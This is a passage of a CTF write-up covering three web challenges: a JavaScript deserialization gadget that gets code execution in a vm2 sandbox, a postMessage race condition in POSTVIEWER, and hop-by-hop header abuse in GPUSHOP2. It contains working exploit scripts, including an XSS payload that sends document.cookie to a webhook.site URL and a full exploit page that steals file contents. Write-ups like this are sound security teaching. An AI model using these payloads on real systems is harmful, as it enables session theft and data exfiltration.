@@ -1,0 +1,627 @@
+```
+
+This code is actually quite long, but in simple terms, the cart passed in will look like this:
+
+``` js
+[
+  {
+    'key': 'cart',
+    'type': 'pickledShoppingCart',
+    'value': [
+      {
+        'key': 'items',
+        'type': 'pickledObject',
+        'value': [
+          {
+            'key': 'abc',
+            'type': 'pickledItem',
+            'value': [
+              {
+                'key': 'price',
+                'type': 'Number',
+                'value': 10
+              },
+              {
+                'key': 'quantity',
+                'type': 'String',
+                'value': '1'
+              }
+            ]
+          }
+        ]
+      },
+      {
+        'key': 'address',
+        'type': 'pickledAddress',
+        'value': [
+          {
+            'key': 'street',
+            'type': 'String',
+            'value': ''
+          },
+          {
+            'key': 'number',
+            'type': 'Number',
+            'value': 0
+          },
+          {
+            'key': 'zip',
+            'type': 'Number',
+            'value': 0
+          }
+        ]
+      },
+      {
+        'key': 'shoppingCartId',
+        'type': 'String',
+        'value': 800600798186
+      }
+    ]
+  },
+  {
+    'key': 'driver',
+    'type': 'pickledDriver',
+    'value': [
+      {
+        'key': 'username',
+        'type': 'String',
+        'value': 'johnnywalker'
+      },
+      {
+        'key': 'orders',
+        'type': 'pickledArray',
+        'value': []
+      }
+    ]
+  },
+  {
+    'key': 'orderId',
+    'type': 'String',
+    'value': 'abc123'
+  }
+]
+```
+
+It can be thought of as a serialized result, and on the server, `pickle.loads(JSON.parse(value))[0]` is used to restore it to various classes.
+
+The most suspicious part of this process is actually the related functions of pickle:
+
+``` js
+export const pickle = {
+  PRIMITIVES: ['String', 'Number', 'Boolean'],
+  loads: json => {
+    const obj = {};
+    for (const {key, type, value} of json) {
+      if (type.match(/^pickled/)) {
+        obj[key] = pickle.loads(value);
+        const constructor = type.replace(/^pickled/, '');
+        obj[key].__proto__ = (globalThis[constructor]||module[constructor]).prototype;
+      } else {
+        obj[key] = new globalThis[type](value);
+      }
+    }
+    return obj;
+  },
+  dumps: obj => {
+    const json = [];
+    for (const key in obj) {
+      const value = obj[key];
+      const type = value.constructor.name;
+      if (typeof type !== 'string') continue;
+      if (typeof value == 'object' && !pickle.PRIMITIVES.includes(type)) {
+        json.push({
+          key,
+          type: 'pickled' + type,
+          value: pickle.dumps(value)
+        });
+      } else if (typeof value !== 'undefined') {
+        json.push({
+          key,
+          type,
+          value: globalThis[type].prototype.valueOf.call(value)
+        });
+      }
+    }
+    return json;
+  }
+};
+```
+
+What I noticed at the beginning was the section `obj[key] = new globalThis[type](value);`. If type is `Function`, we can generate a function. If we can find a way to call that function, we can execute code in the sandbox and tamper with orders and so on.
+
+Another thing I noticed was:
+
+``` js
+obj[key] = pickle.loads(value);
+const constructor = type.replace(/^pickled/, '');
+obj[key].__proto__ = (globalThis[constructor]||module[constructor]).prototype;
+```
+
+The return value of `pickle.loads` here must be an object, and with that `obj[key].__proto__`, we can actually make an object's `__proto__` become a `String` or `Number` object, etc., but it doesn't seem to help.
+
+I also tried changing the key to `__proto__`, thinking that this way we could change `obj.__proto__.__proto__`, but this error was thrown:
+
+> `TypeError: Immutable prototype object '#<Object>' cannot have their prototype set`
+    
+I actually struggled with this problem for quite a while. My original thinking was that executing code might be too difficult, and maybe we could mess with `__proto__` to make the final output key an array. But then I carefully looked at the code that was finally dumped:
+
+``` js
+const json = [];
+for (const key in obj) {
+  const value = obj[key];
+  const type = value.constructor.name;
+  if (typeof type !== 'string') continue;
+  if (typeof value == 'object' && !pickle.PRIMITIVES.includes(type)) {
+    json.push({
+      key,
+      type: 'pickled' + type,
+      value: pickle.dumps(value)
+    });
+  } else if (typeof value !== 'undefined') {
+    json.push({
+      key,
+      type,
+      value: globalThis[type].prototype.valueOf.call(value)
+    });
+  }
+}
+return json;
+```
+
+Your key is taken out from `for in`, guaranteed to be a string, so the output key here will always be a string no matter what. Therefore, if you want the key in orders to be an array, you must be able to execute code to directly manipulate orders.
+
+At this point, I paused for a moment and returned to the essence of this problem: deserialization.
+
+In PHP, Python, or Java, there are vulnerabilities related to deserialization that can be exploited, and the way to do it is to find some gadgets, which are combinations of magic methods. This problem should be the same.
+
+So I looked at the code again and tried to find any implicit type conversions that could be used to construct a `toString` or `valueOf` to execute code, but I didn't find any.
+
+Although I didn't see these things, I did find a place that I thought had a chance:
+
+``` js
+export class DeliveryService {
+  constructor(order, orders) {
+    this.order = order;
+    this.orders = orders;
+  }
+  findDriver() {
+    return new Driver(
+      DRIVERS[Math.floor(Math.random() * DRIVERS.length)], this.orders);
+  }
+  async sendOrder() {
+    const driver = this.findDriver();
+    if (await driver.sendOrder(this.order)) {
+      return this.order.orderId;
+    }
+  }
+};
+```
+
+The key is that sendOrder and what it finally returns.
+
+In JS, if you return a Promise in an async function, it will be resolved, as follows:
+
+``` js
+async function test() {
+  const p = new Promise(resolve => {
+    console.log(123)
+    resolve()
+  })
+  return p
+}
+
+test()
+```
+
+You can see that 123 is printed to the console, and the outer call does not need to await.
+
+Therefore, if `this.order.orderId` is a Promise, you can sneak code in the then.
+
+Let's do an experiment right away:
+
+``` js
+async function test() {
+  var obj = {
+    then: function(resolve) {
+      console.log(123)
+      resolve()
+    }
+  }
+  obj.__proto__ = Promise.prototype
+  return obj
+}
+
+test()
+```
+
+After execution, `123` was successfully output, indicating that this idea is feasible. So, we only need to construct such a JSON to execute code in the sandbox and modify orders:
+
+``` js
+{
+  "key":"shoppingCartId",
+  "type":"pickledPromise",
+  "value":[
+    {
+      "key":"then",
+      "type":"Function",
+      "value":"globalThis.orders.push(JSON.parse('"+payload+"'));arguments[0]();"
+    }
+  ]
+}
+```
+
+(`arguments[0]` in the code is the `resolve` parameter, which will be stuck if not called.)
+
+Finally, the code I used to test and generate the payload is as follows:
+
+``` js
+const {VM, VMScript} = require("vm2");
+const fs = require('fs');
+
+const script = new VMScript(fs.readFileSync('./myshoplib.mjs').toString().replaceAll('export ','') + `
+sendOrder(cart, orders)
+`);
+
+async function main () {
+  let orders = [];
+
+  let payload = JSON.stringify([
+    {
+        'key': 'cart',
+        'type': 'pickledShoppingCart',
+        'value': [
+            {
+                'key': 'items',
+                'type': 'pickledObject',
+                'value': [
+                    {
+                        'key': ['<img src=x onerror="location=`https://webhook.site/d8dc1452-8e82-408d-9dcf-8ad713754f36/?q=${encodeURIComponent(document.cookie)}`">'],
+                        'type': 'pickledItem',
+                        'value': [
+                            {
+                                'key': 'price',
+                                'type': 'Number',
+                                'value': 10
+                            },
+                            {
+                                'key': 'quantity',
+                                'type': 'String',
+                                'value': '1'
+                            }
+                        ]
+                    }
+                ]
+            },
+            {
+                'key': 'address',
+                'type': 'pickledAddress',
+                'value': [
+                    {
+                        'key': 'street',
+                        'type': 'String',
+                        'value': ''
+                    },
+                    {
+                        'key': 'number',
+                        'type': 'Number',
+                        'value': 0
+                    },
+                    {
+                        'key': 'zip',
+                        'type': 'Number',
+                        'value': 0
+                    }
+                ]
+            },
+            {
+                'key': 'shoppingCartId',
+                'type': 'String',
+                'value': 800600798186
+            }
+        ]
+    },
+    {
+        'key': 'driver',
+        'type': 'pickledDriver',
+        'value': [
+            {
+                'key': 'username',
+                'type': 'String',
+                'value': 'johnnywalker'
+            },
+            {
+                'key': 'orders',
+                'type': 'pickledArray',
+                'value': []
+            }
+        ]
+    },
+    {
+        'key': 'orderId',
+        'type': 'String',
+        'value': 'PEW'
+    }
+]).replaceAll('"', '\\"')
+  
+  let cart = JSON.stringify(
+    [{"key":"0","type":"pickledShoppingCart","value":[{"key":"items","type":"pickledObject","value":[{"key":"Tomato","type":"pickledItem","value":[{"key":"price","type":"Number","value":10},{"key":"quantity","type":"String","value":"1"}]},{"key":"Pickle","type":"pickledItem","value":[{"key":"price","type":"Number","value":8},{"key":"quantity","type":"String","value":"0"}]},{"key":"Pineapple","type":"pickledItem","value":[{"key":"price","type":"Number","value":44},{"key":"quantity","type":"String","value":"0"}]}]},{"key":"address","type":"pickledAddress","value":[{"key":"street","type":"String","value":"1"},{"key":"number","type":"Number","value":0},{"key":"zip","type":"Number","value":0}]},{"key":"shoppingCartId","type":"pickledPromise","value":[{"key":"then","type":"Function","value":"globalThis.orders.push(JSON.parse('"+payload+"'));arguments[0]();"}]}]}]
+  );
+
+
+  let vm = new VM({sandbox: {orders, cart, console}});
+  console.log('before')
+  try {
+    let result = await vm.run(script);
+  } catch(err){
+    console.log('err', err)
+  }
+  console.log('after')
+  console.log('orders')
+  console.log(orders)
+
+  console.log(encodeURIComponent(cart))
+
+  //console.log(orders[0][0].value[0])
+}
+main()
+```
+
+### POSTVIEWER (10 solves)
+
+The core code of this problem is directly attached below:
+
+``` html
+const SHIM = `<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>SHIM</title>
+</head>
+<body>
+    <script>
+        onmessage = (e) => {
+            if (e.data.body === undefined || !e.data.mimeType) {
+                return;
+            };
+            const blob = new Blob([e.data.body], {
+                type: e.data.mimeType
+            });
+            onunload = () => e.source.postMessage("blob loaded", "*");
+            location = URL.createObjectURL(blob);
+        };
+    <\\/script>
+</body>
+</html>`
+const SHIM_DATA_URL = `data:text/html,<script>
+    location=URL.createObjectURL(new Blob([\`${SHIM}\`], {type:"text/html"}))
+</script>`;
+async function previewIframe(container, body, mimeType) {
+    var iframe = document.createElement('iframe');
+    iframe.src = SHIM_DATA_URL;
+    container.appendChild(iframe);
+    iframe.addEventListener('load', () => {
+        iframe.contentWindow?.postMessage({ body, mimeType }, '*');
+    }, { once: true });
+}
+```
+
+When you call `previewIframe`, an iframe is first generated, and then the HTML inside is generated in another HTML using `location=URL.createObjectURL`, and `onmessage` is used to listen for messages. After the iframe is successfully loaded, `postMessage` is used to send the content to be displayed.
+
+However, there is a race condition problem with this approach. If we keep sending `postMessage` to the iframe, we can render the content we need before the iframe's `onload` event is triggered, allowing us to control the content inside the iframe.
+
+The ideal process for this problem is as follows:
+
+1. `previewIframe` is called.
+2. An iframe is created and SHIM is loaded.
+3. SHIM is loaded successfully and starts listening for messages.
+4. Our `postMessage` is successful and our content starts loading.
+5. Our content is loaded successfully.
+6. The `onload` event of the iframe is triggered, and `iframe.contentWindow?.postMessage` is executed.
+7. Our HTML receives the file content and successfully steals the file.
+
+When I was solving this problem, I encountered a problem with the order of steps 5 and 6. No matter what I tried, I could only achieve: "Our content is indeed loaded, but we missed the outer `postMessage`."
+
+Initially, my idea was to send messages aggressively to win the race condition, like this:
+
+``` js
+function send() {
+  w[0]?.postMessage({
+    body: 'test',
+    mimeType: 'text/html'
+  }, '*')
+  setTimeout(send, 0)
+}
+send()
+```
+
+However, I found that even XSS could not be triggered in this way, but changing the timeout to a larger value, such as 20, could.
+
+Later, I did some experiments and realized why this couldn't be done. It's because of this part:
+
+``` js
+onmessage = (e) => {
+    if (e.data.body === undefined || !e.data.mimeType) {
+        return;
+    };
+    const blob = new Blob([e.data.body], {
+        type: e.data.mimeType
+    });
+    onunload = () => e.source.postMessage("blob loaded", "*");
+    location = URL.createObjectURL(blob);
+};
+```
+
+Note that after `location = URL.createObjectURL(blob)` is executed, the location will not switch immediately. Therefore, if we keep sending messages, `onmessage` will keep triggering, and the `location` line will keep being triggered. The previous location has not finished loading, and a new one is assigned, becoming an infinite loop.
+
+The reason why increasing the timeout works is that if the location loading time is less than 20ms, the page will be switched when the new message is sent, so XSS can be successfully triggered.
+
+Also, I did an experiment and found that the loading of `location` is unrelated to the UI thread, that is:
+
+``` js
+location = '//example.com'
+while(1){}
+```
+
+This code will still successfully switch pages without any problems.
+
+The most difficult part of this problem is determining the timing of sending messages. Why do we have to keep sending messages? Because we don't know exactly when to send them, so we have to keep trying. We can wait for the iframe to be ready before sending messages, but at that time, the iframe has not loaded SHIM, so sending messages is useless. So how do we know when SHIM has loaded successfully? We don't know, so it's complicated.
+
+Later, I continued to experiment and found that we can delay the main thread by constantly changing the hash or using a very time-consuming selector, but we still cannot control the order, and in the end, I couldn't solve it.
+
+The official solution is here: https://gist.github.com/terjanq/7c1a71b83db5e02253c218765f96a710
+
+After reading it, I realized that I had the order wrong.
+
+I was always thinking about delaying the main thread, but because the main page and the iframe are different processes, we only need to detect when the iframe is loaded successfully, and then find a way to delay the main thread. At this time, the iframe is still loading SHIM, but `onload` is temporarily blocked and will not be triggered.
+
+At this point, we only need to wait for a period of time (the official solution is 500ms) before sending `postMessage`. At that time, SHIM has been loaded, and although the main thread is still blocked, the iframe is still loading.
+
+In this way, when the main thread is free to do something, our iframe has already been loaded, and we can get the data.
+
+### GPUSHOP2 (7 solves)
+
+This problem was modified from last year's version.
+
+I didn't look at it very carefully, but it should be caused by URL encoding a certain path, which leads to the proxy not matching the path.
+
+This year's version fixed last year's problem by always adding an `X-Wallet: EMPTY` header, so last year's solution cannot be used.
+
+The final solution is hop-by-hop headers. What is that?
+
+HTTP request headers can be divided into two types:
+
+1. End-to-end
+2. Hop-by-hop
+
+Because when you send an HTTP request, it may go through a proxy, right? Hop-by-hop headers are headers that are intended for the proxy. The proxy will process them and may not forward them to the next server after processing.
+
+The following are all hop-by-hop headers:
+
+1. Connection
+2. Keep-Alive
+3. Proxy-Authenticate
+4. Proxy-Authorization
+5. TE
+6. Trailers
+7. Transfer-Encoding
+8. Upgrade
+
+In addition, according to the spec, headers placed in `Connection` should also be treated as hop-by-hop. For example:
+
+```
+Connection: close, X-Foo, X-Bar
+```
+
+This tells the proxy to treat X-Foo and X-Bar as hop-by-hop headers and remove them, not to send them to the next proxy.
+
+Therefore, for this question, we can use this feature to remove `X-Wallet`:
+
+```
+Connection: X-Wallet
+```
+
+For more related research, please refer to this article: https://nathandavison.com/blog/abusing-http-hop-by-hop-request-headers
+
+## POSTVIEWER Script Backup
+
+Here is the official answer script backup. It seems to use postMessage + onmessage to achieve the effect of an asynchronous infinite loop, which is quite interesting.
+
+``` html
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>POC Vulnerable website</title>
+</head>
+<body>
+    <h1>Click me!</h1>
+    <iframe style="width:1px;height:1px" name="loop"></iframe>
+    <pre id="log"></pre>
+    <script>
+        const URL = 'https://postviewer-web.2022.ctfcompetition.com';
+        const sleep = (d) => new Promise((r) => setTimeout(r, d));
+        function notify(...args){
+            navigator.sendBeacon('', args);
+            console.log(...args);
+        }
+        async function load(win, url) {
+            const buffer = new Uint8Array(1e7);
+            win.location = 'about:blank';
+            await new Promise((resolve) => {
+                loop.onmessage = () => {
+                    try {
+                        win.origin;
+                        resolve();
+                    } catch (e) {
+                        loop.postMessage(null);
+                    }
+                };
+                loop.postMessage(null);
+            });
+            win.location = url;
+            await new Promise((resolve) => {
+                loop.onmessage = () => {
+                    if (win.length === 1) {
+                        // Send a huge message so e.data.toString() blocks a thread for a while
+                        // By transfering only a reference to memory chunk, sending the message
+                        // will be fast enough to race condition window.onmessage and iframe.onload
+                        // notify(Date.now(), '==1');
+                        win?.postMessage(buffer, '*', [buffer.buffer]);
+                        // Once we know the innerIframe loaded, we can now postMessage to it
+                        // because it will be rendered in a different process in Chrome, so
+                        // the blocked parent thread won't affect rendering the iframe!
+                        setTimeout(() => {
+                            win[0]?.postMessage(
+                                {
+                                    body: `LOL! <script>onmessage=async (e)=>{
+                      let text = await e.data.body.text();
+                      parent.opener.postMessage({stolen: text}, '*');
+                    }<\/script>`,
+                                    mimeType: "text/html",
+                                },
+                                "*"
+                            );
+                            resolve();
+                        }, 500);
+                    } else {
+                        loop.postMessage(null);
+                    }
+                };
+                loop.postMessage(null);
+            });
+            return 1;
+        }
+        var TIMEOUT = 1500;
+        var win;
+        function waitForMessage(url) {
+            return new Promise(async resolve => {
+                onmessage = e => {
+                    if (e.data.stolen) {
+                        notify(e.data.stolen);
+                        log.innerText += e.data.stolen + '\n';
+                        resolve(false);
+                    }
+                }
+                const rnd = 'a' + Math.random().toString(16).slice(2);
+                const _url = url + ',' + rnd;
+                await load(win, _url);
+                setTimeout(() => {
+                    resolve(true);
+                }, TIMEOUT);
+            });
+        }
+        onload = onclick = async () => {
+            if (!win || win.closed) {
+                win = open('about:blank', 'hack', 'width=800,height=300,top=500');
+            }
+            for (let i = 1; i < 100; i++) {
+                const url = `${URL}/#a,.list-group-item:nth-child(${i})`;
+                while (await waitForMessage(url));
+            }
+        };
+    </script>
+</body>
+</html>
+```
